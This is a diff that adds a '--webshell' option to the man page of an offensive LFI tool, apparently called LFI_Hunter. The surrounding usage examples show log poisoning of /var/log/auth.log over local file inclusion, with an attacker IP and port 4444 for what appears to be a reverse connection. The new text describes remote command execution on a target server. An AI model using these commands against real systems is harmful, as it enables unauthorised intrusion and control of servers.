@@ -51,6 +51,7 @@ class ManPage:
                      -FP, --PARAME                   parameter fuzzing [replace the parameter with PARAME in url]
                      -PL, --paramslist               parameter fuzzing wordlist
                      -s,  --status                   Filter parameter with HTTP status responses
+                     --webshell                      Execute commands via web shell directly from the command line for remote server interaction.
 
                      -UV, --Vulnurl URL
                             Specifies the target URL for the web application vulnerable to LFI. 
@@ -179,6 +180,17 @@ class ManPage:
                             This command specifies /var/log/auth.log as the target file for log poisoning.
                             LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -R /var/log/auth.log
                             LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -Z
+                            
+                     --webshell 
+                    
+                            The --webshell option works by capturing the web application's responses and saving them into files.
+                            After the initial request, the second response is compared with the first to detect any differences. 
+                            This process works over the HTTP protocol or via a socket connection (using a specific IP and port). Essentially,
+                            it allows remote command execution on the target server, similar to using a web shell directly from the browser, 
+                            letting the attacker interact with the server and run commands in real time.
+                            Example:
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  -R /var/log/auth.log --webshell     
+
 
                      --port PORT
 
